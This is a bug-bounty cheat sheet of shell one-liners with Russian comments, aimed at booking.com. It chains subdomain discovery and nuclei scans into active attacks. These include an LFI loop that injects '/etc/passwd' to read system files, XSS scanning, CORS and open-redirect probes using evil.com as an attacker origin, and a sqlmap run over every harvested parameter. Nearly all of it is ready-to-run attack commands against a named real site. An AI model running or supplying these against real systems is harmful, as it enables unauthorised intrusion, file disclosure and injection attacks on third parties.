🐛💵
* echo booking.com > target.txt
# найдет субдомены tool [subfinder](https://github.com/projectdiscovery/subfinder)
* subfinder -dL target.txt -all --recursive -o subs.txt
# оставляет только живые  tool [httpx](https://github.com/projectdiscovery/httpx)
* cat subs.txt | httpx -o aliveSubs.txt
# вытащить все юрл с субдоменов tool [waybackurls](https://github.com/tomnomnom/waybackurls)
* cat subs.txt | waybackurls | tee urls.txt
# перверяет субдомен тейковер среди живых доменов
* nuclei -t /nuclei-templates/takovers/ -l aliveSubs.txt
# template [fuzzing-templates](https://github.com/projectdiscovery/fuzzing-templates) 
* nuclei -l urls.txt -t /nuclei-templates/fuzzing-templates/
# проверяет на cve, exposure, vuln template [nuclei-templates](https://github.com/projectdiscovery/nuclei-templates) 
* nuclei -list aliveSubs.txt -t /nuclei-templates/vulnerabilities -t /nuclei-templates/cves -t /nuclei-templates/exposures
# из юрл извлекаем те юрл у которых есть параметры и js файлы 
* cat urls.txt | grep "=" | tee param.txt
* cat urls.txt | grep -iE '.js'| grep -ivE '.json' | sort -u | tee js.txt
# проверяет баги в js файлах 
* nuclei -t /nuclei-templates/http/exposures/ -l js.txt -o jsBugs.txt
# проверяет xss tool [dalfox](https://github.com/hahwul/dalfox)
* cat urls.txt | uro | gf xss > xss.txt
* cat param.txt | kxss
* paramspider -d booking.com
* dalfox file xss.txt  | tee XSSvulnerable.txt
# проверяет lfi 
* cat aliveSubs.txt | gau | uro | gf lfi | tee lfi.txt
* nuclei -l target.txt -tags lfi
* cat aliveSubs.txt | gau | uro | gf lfi | qsreplace  "/etc/passwd" | while read url; do curl -silent "$url" | grep "root:x:" && echo "$url is Vulnerable"; done;
# проверяет CORS 
* site=$(cat target.txt); gau $site | while read url; do target=$(curl -sIH Origin: https://evil.com -X GET $url) | if grep 'https://evil.com'; then [Potentional CORS Found] echo $url; else echo Nothing on $url; fi; done
# проверяет sqli tool [sqliFinder](https://github.com/americo/sqlifinder)
* python3 sqlifinder.py -d booking.com
* sqlmap -m param.txt --batch --random-agent --level 1 | tee sqlmap.txt
# проверяет открытое перенаправление 
* cat urls.txt | grep -a -i =http | qsreplace 'evil.com' | while read host do;do curl -s -L $host -I| grep evil.com && echo $host 3[0;31mVulnerable\n ;done
# нуклей фазер проверет все уязвимости 
* nf -d booking.com

